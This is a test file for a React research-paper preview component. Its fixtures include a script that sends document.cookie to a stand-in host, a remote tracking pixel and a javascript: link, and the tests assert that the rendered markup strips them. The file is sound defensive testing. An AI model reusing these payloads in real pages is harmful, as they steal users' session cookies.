import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import type {
  DocumentReconstruction,
  PublicationAsset,
  PublicationVisualRelationship,
} from '../../research/import-types'
import type { ResearchPaper } from '../../research/schema'
import ResearchStudio from './ResearchStudio'

const HOSTILE_XHTML = [
  '<?xml version="1.0" encoding="utf-8"?>',
  '<html xmlns="http://www.w3.org/1999/xhtml"><body>',
  '<script>fetch("https://exfiltrate.invalid/" + document.cookie)</script>',
  '<img src="https://remote-pixel.invalid/track.gif" alt="pixel"/>',
  '<table><tr><td>HOSTILE-CELL-TEXT</td></tr></table>',
  '</body></html>',
].join('')

const RASTER_MARKER = 'RASTER-SOURCE-BYTES-MARKER'

const INTRO_TEXT =
  'Reconstructed prose keeps bold, italic, a source link, an H2O subscript, an x2 exponent, and a note marker.'

function span(text: string, needle: string) {
  const start = text.indexOf(needle)
  if (start < 0) throw new Error(`Fixture text is missing "${needle}"`)
  return { start, end: start + needle.length }
}

function asset(
  id: string,
  mediaType: PublicationAsset['mediaType'],
  body: string,
): PublicationAsset {
  return {
    id,
    href: `assets/${id}`,
    mediaType,
    kind: mediaType === 'application/xhtml+xml' ? 'table' : 'raster',
    rendition:
      mediaType === 'application/xhtml+xml'
        ? 'semantic-table'
        : 'source-preserved',
    sha256: id.padEnd(64, '0'),
    bytes: new TextEncoder().encode(body),
    width: 320,
    height: 240,
    resolutionDpi: 144,
    sourceObjectIds: [`${id}-object`],
    sourceBoxes: [],
  }
}

function relationship(
  id: string,
  kind: PublicationVisualRelationship['kind'],
  canonicalNodeId: string,
  captionNodeId: string,
  assetIds: string[],
  status: PublicationVisualRelationship['status'] = 'matched',
): PublicationVisualRelationship {
  return {
    id,
    kind,
    label: id,
    captionRegionId: `${id}-caption-region`,
    sourceRegionIds: [`${id}-region`],
    sourceObjectIds: assetIds.map((assetId) => `${assetId}-object`),
    assetIds,
    status,
    confidence: 1,
    evidence: ['caption-adjacency'],
    candidates: [],
    sourceBoxes: [],
    sourceText: `${id} source text`,
    altText: `${id} alternative text`,
    altTextSource: 'caption',
    canonicalNodeId,
    captionNodeId,
  }
}

const importedPaper: ResearchPaper = {
  id: 'structured-scientific',
  version: '1.0.0',
  status: 'working',
  title: 'Structured scientific reconstruction',
  subtitle: 'Imported source review fixture',
  authors: ['Imported Author'],
  updated: '2026-07-21',
  abstract: 'A minimal imported reconstruction used to prove preview truth.',
  nodes: [
    {
      id: 'h-results',
      source: 'page-001-region-001',
      type: 'heading',
      level: 2,
      text: 'Results',
    },
    {
      id: 'p-inline',
      source: 'page-001-region-002',
      type: 'paragraph',
      text: INTRO_TEXT,
      inlineRuns: [
        { ...span(INTRO_TEXT, 'bold'), bold: true },
        { ...span(INTRO_TEXT, 'italic'), italic: true },
        {
          ...span(INTRO_TEXT, 'source link'),
          href: 'https://example.org/source-paper',
        },
        { ...span(INTRO_TEXT, '2O'), verticalAlign: 'subscript' },
        { ...span(INTRO_TEXT, '2 exponent'), verticalAlign: 'superscript' },
      ],
      noteReferences: [
        {
          id: 'noteref-1',
          label: '1',
          target: 'fn-1',
          ...span(INTRO_TEXT, 'note marker'),
          confidence: 1,
        },
      ],
    },
    {
      id: 'p-hostile-link',
      source: 'page-001-region-003',
      type: 'paragraph',
      text: 'An unsafe scheme must stay inert prose.',
      inlineRuns: [
        {
          start: 3,
          end: 17,
          href: 'javascript:alert(document.cookie)',
        },
      ],
    },
    {
      id: 'fig-panels',
      source: 'page-001-region-004',
      type: 'figure',
      title: 'Figure 1',
      objectType: 'figure',
      relationships: { caption: 'cap-panels' },
    },
    {
      id: 'cap-panels',
      source: 'page-001-region-005',
      type: 'caption',
      text: 'Three panels, two of which reuse one content-addressed asset.',
    },
    {
      id: 'fig-table',
      source: 'page-001-region-006',
      type: 'figure',
      title: 'Table 1',
      objectType: 'table',
      table: {
        rows: [
          {
            cells: [
              {
                text: 'Condition',
                headerScope: 'column',
                columnSpan: 1,
                rowSpan: 1,
              },
              {
                text: 'Accuracy',
                headerScope: 'column',
                columnSpan: 1,
                rowSpan: 1,
              },
            ],
          },
          {
            cells: [
              {
                text: 'Baseline',
                headerScope: 'row',
                columnSpan: 1,
                rowSpan: 1,
              },
              { text: '0.71', headerScope: null, columnSpan: 1, rowSpan: 1 },
            ],
          },
        ],
      },
      relationships: { caption: 'cap-table' },
    },
    {
      id: 'cap-table',
      source: 'page-001-region-007',
      type: 'caption',
      text: 'Accuracy by condition.',
    },
    {
      id: 'fig-xhtml',
      source: 'page-001-region-008',
      type: 'figure',
      title: 'Table 2',
      objectType: 'table',
      relationships: { caption: 'cap-xhtml' },
    },
    {
      id: 'cap-xhtml',
      source: 'page-001-region-009',
      type: 'caption',
      text: 'A generated XHTML asset with no canonical table in the graph.',
    },
    {
      id: 'fig-unmatched',
      source: 'page-001-region-010',
      type: 'figure',
      title: 'Figure 2',
      objectType: 'figure',
      relationships: { caption: 'cap-unmatched' },
    },
    {
      id: 'cap-unmatched',
      source: 'page-001-region-011',
      type: 'caption',
      text: 'No relationship resolved for this visual.',
    },
    {
      id: 'fn-1',
      source: 'page-001-region-012',
      type: 'footnote',
      kind: 'footnote',
      label: '1',
      text: 'The note body travels with its return link.',
      relationships: { backlinks: ['noteref-1'] },
    },
  ],
}

function importedReconstruction(): DocumentReconstruction {
  return {
    source: {
      fileName: 'structured-scientific.pdf',
      byteLength: 4096,
      sha256: 'a'.repeat(64),
      pageCount: 1,
      localOnly: true,
    },
    paper: importedPaper,
    assets: [
      asset('asset-panel', 'image/png', RASTER_MARKER),
      asset('asset-second', 'image/png', RASTER_MARKER),
      asset('asset-table-xhtml', 'application/xhtml+xml', HOSTILE_XHTML),
      asset('asset-orphan-xhtml', 'application/xhtml+xml', HOSTILE_XHTML),
    ],
    visualRelationships: [
      // The middle asset differs, but the first and third occurrences share one
      // content-addressed id: three panels must survive as three occurrences.
      relationship('rel-panels', 'figure', 'fig-panels', 'cap-panels', [
        'asset-panel',
        'asset-second',
        'asset-panel',
      ]),
      relationship('rel-table', 'table', 'fig-table', 'cap-table', [
        'asset-table-xhtml',
      ]),
      relationship('rel-xhtml', 'table', 'fig-xhtml', 'cap-xhtml', [
        'asset-orphan-xhtml',
      ]),
      relationship(
        'rel-unmatched',
        'figure',
        'fig-unmatched',
        'cap-unmatched',
        [],
        'unresolved',
      ),
    ],
  } as unknown as DocumentReconstruction
}

function figureMarkup(markup: string, nodeId: string) {
  const start = markup.indexOf(`<figure data-node-id="${nodeId}"`)
  if (start < 0) throw new Error(`Markup is missing figure ${nodeId}`)
  const end = markup.indexOf('</figure>', start)
  return markup.slice(start, end)
}

function importedMarkup() {
  return renderToStaticMarkup(
    <ResearchStudio
      paper={importedPaper}
      reconstruction={importedReconstruction()}
    />,
  )
}

describe('research studio imported preview', () => {
  it('keeps hostile XHTML bytes and executable elements out of preview markup', () => {
    const markup = importedMarkup()

    expect(markup).not.toContain('<script')
    expect(markup).not.toContain('<object')
    expect(markup).not.toContain('<iframe')
    expect(markup).not.toContain('<embed')
    expect(markup).not.toContain('srcdoc')
    expect(markup).not.toContain('exfiltrate.invalid')
    expect(markup).not.toContain('remote-pixel.invalid')
    expect(markup).not.toContain('HOSTILE-CELL-TEXT')
    expect(markup).not.toContain('document.cookie')
    expect(markup).not.toContain(RASTER_MARKER)
    expect(markup).not.toContain('http://www.w3.org/1999/xhtml')
  })

  it('marks a generated XHTML asset with no canonical table as unresolved', () => {
    const markup = importedMarkup()

    expect(markup).toContain(
      'Structured source asset available in export · safe preview requires a semantic table',
    )
    expect(markup).toContain('data-asset-id="asset-orphan-xhtml"')
  })

  it('renders a generated XHTML table asset from the semantic table in the graph', () => {
    const markup = importedMarkup()

    expect(markup).toContain('<table>')
    expect(markup).toContain('scope="col">Condition</th>')
    expect(markup).toContain('scope="col">Accuracy</th>')
    expect(markup).toContain('scope="row">Baseline</th>')
    expect(markup).toContain('>0.71</td>')
    expect(markup).toContain('<div class="srt-preview-table" role="region"')
    expect(markup).toContain('aria-label="Table 1"')
    expect(markup).not.toContain('data-asset-id="asset-table-xhtml"')
  })

  it('keeps repeated relationship asset ids as repeated visual occurrences', () => {
    const markup = importedMarkup()

    expect(markup.match(/Preparing source visual…/g)).toHaveLength(3)
  })

  it('shows an explicit review-required state for an unmatched visual', () => {
    const markup = importedMarkup()

    expect(markup).toContain('Source visual unresolved · review required')
    expect(markup).not.toContain('Semantic composition pipeline')
  })

  it('keeps every complete caption inside its own anchoring figure', () => {
    const markup = importedMarkup()
    const panels = figureMarkup(markup, 'fig-panels')
    const table = figureMarkup(markup, 'fig-table')
    const captionText =
      'Three panels, two of which reuse one content-addressed asset.'

    expect(panels).toContain('<figcaption data-node-id="cap-panels"')
    expect(panels).toContain('id="cap-panels"')
    expect(panels).toContain(`<b>Figure 1.</b> ${captionText}`)
    expect(table).toContain('<b>Table 1.</b> Accuracy by condition.')
    // The caption belongs to its figure and nowhere else in the stream.
    expect(markup.split(captionText)).toHaveLength(2)
    const beforeFigure = markup.slice(
      0,
      markup.indexOf('data-node-id="fig-panels"'),
    )
    expect(beforeFigure).not.toContain(captionText)
  })

  it('renders source-backed inline semantics with EPUB-equivalent elements', () => {
    const markup = importedMarkup()

    expect(markup).toContain('<strong>bold</strong>')
    expect(markup).toContain('<em>italic</em>')
    expect(markup).toContain('<a href="https://example.org/source-paper">')
    expect(markup).toContain('<sub>2O</sub>')
    expect(markup).toContain('<sup>2 exponent</sup>')
    expect(markup).toContain('role="doc-noteref"')
    expect(markup).toContain('id="noteref-1"')
    expect(markup).toContain('href="#fn-1"')
    expect(markup).toContain('role="doc-footnote"')
    expect(markup).toContain('data-note-kind="footnote"')
    expect(markup).toContain('href="#noteref-1"')
  })

  it('refuses an unsafe link scheme without dropping its prose', () => {
    const markup = importedMarkup()

    expect(markup).not.toContain('javascript:')
    expect(markup).toContain('An unsafe scheme must stay inert prose.')
  })

  it('opens in the continuous mobile source-review profile', () => {
    const markup = importedMarkup()

    expect(markup).toContain('data-target-profile="mobile"')
    expect(markup).toContain('data-finite-height="false"')
    expect(markup).toContain(
      'Continuous source review; profile downloads are validated separately.',
    )
    expect(markup).toContain('>Mobile</button>')
    expect(markup).not.toContain('>Paper Pro</button>')
    expect(markup).not.toContain('Print / PDF')
  })

  it('gives every available profile button an explicit selected state', () => {
    const markup = importedMarkup()
    const profiles = markup.slice(
      markup.indexOf('aria-label="Target profile"'),
      markup.indexOf('aria-label="Reflow controls"'),
    )

    expect(profiles.match(/<button/g)).toHaveLength(1)
    expect(profiles.match(/aria-pressed="true"/g)).toHaveLength(1)
  })

  it('injects no synthetic annotation or reading anchor into an import', () => {
    const markup = importedMarkup()

    expect(markup).not.toContain('srt-annotation-highlight')
    expect(markup).not.toContain('srt-note-target')
    expect(markup).not.toContain('data-reading-anchor="true"')
    expect(markup).toContain('data-reading-anchor-node="unavailable"')
    expect(markup).toContain('data-reading-anchor-status="unavailable"')
    expect(markup).toContain('No text annotations available for this paper.')
  })

  it('keeps the authored demo annotated and on its full profile matrix', () => {
    const markup = renderToStaticMarkup(<ResearchStudio paper={importedPaper} />)

    expect(markup).toContain('srt-annotation-highlight')
    expect(markup).toContain('data-reading-anchor="true"')
    expect(markup).toContain('>Mobile</button>')
    expect(markup).toContain('>Paper Pro</button>')
    expect(markup).toContain('Semantic composition pipeline')
  })
})
